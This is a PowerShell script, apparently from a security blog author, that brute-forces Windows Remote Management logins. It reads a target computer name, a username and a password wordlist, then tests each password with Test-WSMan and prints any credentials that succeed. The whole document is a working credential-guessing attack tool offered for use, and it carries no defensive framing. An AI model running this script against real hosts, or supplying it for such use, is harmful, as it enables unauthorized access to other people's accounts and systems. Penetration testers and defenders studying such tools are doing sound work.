function Bruteforce_winrm {

Write-Output " ___       __   ___  ________   ________  _____ ______           ________  ________  ________  ________   ________   _______   ________     "
Write-Output "|\  \     |\  \|\  \|\   ___  \|\   __  \|\   _ \  _   \        |\   ____\|\   ____\|\   __  \|\   ___  \|\   ___  \|\  ___ \ |\   __  \    "
Write-Output "\ \  \    \ \  \ \  \ \  \\ \  \ \  \|\  \ \  \\\__\ \  \       \ \  \___|\ \  \___|\ \  \|\  \ \  \\ \  \ \  \\ \  \ \   __/|\ \  \|\  \   "
Write-Output " \ \  \  __\ \  \ \  \ \  \\ \  \ \   _  _\ \  \\|__| \  \       \ \_____  \ \  \    \ \   __  \ \  \\ \  \ \  \\ \  \ \  \_|/_\ \   _  _\  "
Write-Output "  \ \  \|\__\_\  \ \  \ \  \\ \  \ \  \\  \\ \  \    \ \  \       \|____|\  \ \  \____\ \  \ \  \ \  \\ \  \ \  \\ \  \ \  \_|\ \ \  \\  \| "
Write-Output "   \ \____________\ \__\ \__\\ \__\ \__\\ _\\ \__\    \ \__\        ____\_\  \ \_______\ \__\ \__\ \__\\ \__\ \__\\ \__\ \_______\ \__\\ _\ "
Write-Output "    \|____________|\|__|\|__| \|__|\|__|\|__|\|__|     \|__|       |\_________\|_______|\|__|\|__|\|__| \|__|\|__| \|__|\|_______|\|__|\|__|"
Write-Output "                                                                   \|_________|                                                             "
Write-Output "                                                                                                                                            "
Write-Output " Author: Https://ctrlaltdel.blog"


# Gather Details

$computername = Read-Host -Prompt "computername"
$username = Read-Host -Prompt "username"
$wordlist = Read-Host -Prompt "wordlist"

#Get the wordlist
$passwords = Get-Content $wordlist

foreach ($password in $passwords) {

#clear all errors
        $Error.clear()

#Convert values and place them within PSCRED

         
         $secpassword = ConvertTo-SecureString $password -AsPlainText -Force
         $mycredential = New-Object System.Management.Automation.PSCredential ($username, $secpassword)

         #Test Connection of each password
        
         $result = Test-WSMan -ComputerName $computername -Credential $mycredential -Authentication Negotiate -erroraction SilentlyContinue


         # If connection fails, no error and pass nothing

if ($result -eq $null) {

Write-Output "Testing Password: $password = Failed"

#reset the end password
$yourpassword = $null

} else {

#results are successfull and show the password

Write-Output "Testing Password: $password = Success"
$yourpassword = $password

}

if ($yourpassword -eq $null) {

} Else {

#Print out the credenetials that worked 

Write-Output "Credentails for $computername are $username and $password"

}

}
}